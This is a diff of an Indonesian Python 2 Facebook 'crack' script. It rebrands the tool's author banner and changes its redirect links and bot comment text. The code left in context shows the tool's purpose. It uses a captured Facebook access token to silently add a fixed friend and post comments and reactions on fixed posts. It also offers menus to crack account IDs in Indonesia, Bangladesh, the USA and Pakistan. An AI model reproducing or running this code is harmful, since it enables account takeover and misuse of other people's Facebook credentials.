@@ -83,20 +83,11 @@ def jalan(z):
 		
 #########LOGO#########
 logo = """ 
-\033[1;91m ✰ ●▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬● \033[1;97m✰ ▇◤▔▔▔▔▔▔▔◥▇ ✰
-\033[1;91m ✰ ██████╗░░█████╗░███╗░░░███╗██╗ \033[1;97m✰ ▇▏◥▇◣┊◢▇◤▕▇ ✰
-\033[1;91m ✰ ██╔══██╗██╔══██╗████╗░████║██║ \033[1;97m✰ ▇▏▃▆▅▎▅▆▃▕▇ ✰
-\033[1;91m ✰ ██████╔╝██║░░██║██╔████╔██║██║ \033[1;97m✰ ▇▏╱▔▕▎▔▔╲▕▇ ✰
-\033[1;97m ✰ ██╔══██╗██║░░██║██║╚██╔╝██║██║ ✰ ▇◣◣▃▅▎▅▃◢◢▇ ✰
-\033[1;97m ✰ ██║░░██║╚█████╔╝██║░╚═╝░██║██║ ✰ ▇▇◣◥▅▅▅◤◢▇▇ ✰
-\033[1;97m ✰ ╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝ ✰ ▇▇▇◣╲▇╱◢▇▇▇ ✰
-\033[1;97m ✰ ●▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬● ✰ ▇▇▇▇◣▇◢▇▇▇▇ ✰
-\033[1;92m █▀▀\033[1;92m █▀█\033[1;92m █░█\033[1;92m █▀▀\033[1;92m █▄▀\033[1;92m █▀▀\033[1;92m █▀█  █▀█\033[1;92m █▀█\033[1;92m █▀█
-\033[1;92m █▄▄\033[1;92m █▀▄\033[1;92m ▀▀█\033[1;92m █▄▄\033[1;92m █░█\033[1;92m ██▄\033[1;92m █▀▄  █▀▀\033[1;92m █▀▄\033[1;92m █▄█
+\033[1;97m $$$$$$$\ $$\ $$ __$$\ $$ | $$ | $$ | $$$$$$\ $$$$$$\ $$ | $$\ $$ | $$ | \____$$\ $$ __$$\ $$ | $$ | $$ | $$ | $$$$$$$ |$$ | \__|$$$$$$ / $$ | $$ |$$ __$$ |$$ | $$ _$$< $$$$$$$ |\$$$$$$$ |$$ | $$ | \$$\ \_______/ \_______|\__| \__| \__|
 \033[1;94m──────────────────────────────────────────────────
-\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mAuthor   \033[1;91m: \033[1;96mCyber Lampung
-\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mFacebook \033[1;91m: \033[1;96mROMI AFRIZAL
-\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mWhatsAp  \033[1;91m: \033[1;96m08237164818×"""
+\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mEditor   \033[1;91m: \033[1;96mRamdhan Ramadhian
+\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mInstagram \033[1;91m: \033[1;96m@ramdhan.ramadhian99
+\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mYoutube  \033[1;91m: \033[1;96mTutoriality Studio"""
 
 back = 0
 threads = []
@@ -149,8 +140,8 @@ def tokenz():
 		zedd.write(toket)
 		zedd.close()
 		print '\033[1;97m{\033[1;92m✓\033[1;97m}\033[1;93m Login Berhasil ! '
-		jalan ('\033[1;97mJANGAN LUPA FOLLOW AKUN FACEBOOK PRIBADI GUA YA :)')
-		os.system('xdg-open https://www.facebook.com/romi.rizal.58')
+		jalan ('\033[1;97mJANGAN LUPA SUBREK CHANNEL YOUTUBE GW YA :)')
+		os.system('xdg-open http://www.youtube.com/channel/UC7kqla4Jh-ujwE6BKaUE_Rw')
 		bot_komen()
 	except KeyError:
 		print "\033[1;97m{\033[1;91m!\033[1;97m} \033[1;91mToken salah !"
@@ -162,7 +153,7 @@ def ambil_token():
 	os.system ("clear")
 	print logo
 	print 50* "\033[1;94m─"
-	jalan("        \033[1;92mAnda Akan Di Arahkan Ke Browser ...")
+	jalan("        \033[1;92mAnda Akan Di Arahkan Ke Browser Gunakanlah Akun Tumbal ...")
 	os.system('xdg-open https://drive.google.com/file/d/1eAuQG4aFIH49r0ACpoUWspnSG2VUl4Ci/view?usp=drivesdk')
 	time.sleep(2)
 	masuk()
@@ -175,11 +166,11 @@ def bot_komen():
 		print"\033[1;97m[!] Token invalid"
 		os.system('rm -rf login.txt')
 	una = ('100047165779215')
-	kom = ('Mantap Bang 😘')
+	kom = ('Eh Ada Orang Ganteng 😘')
 	reac = ('LOVE')
 	post = ('213235326925325')
 	post2 = ('209016570680534')
-	kom2 = ('Izin pakai script lu bang😁')
+	kom2 = ('Aku ngefans banget sama kamu 😁')
 	reac2 = ('ANGRY')
 	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
@@ -261,7 +252,7 @@ def crack_teman():
 	print 50* "\033[1;94m─"
 	print "\033[1;97m{"+warna+"01\033[1;97m}"+warni+" Crack ID Indonesia"
 	print "\033[1;97m{"+warna+"02\033[1;97m}"+warni+" Crack ID Bangladesh"
-	print "\033[1;97m{"+warna+"03\033[1;97m}"+warni+" Crack ID Usa"
+	print "\033[1;97m{"+warna+"03\033[1;97m}"+warni+" Crack ID USA"
 	print "\033[1;97m{"+warna+"04\033[1;97m}"+warni+" Crack ID Pakistan"
 	print "\033[1;97m{\033[1;91m00\033[1;97m}"+warni+" Kembali"
 	print 50* "\033[1;94m─"
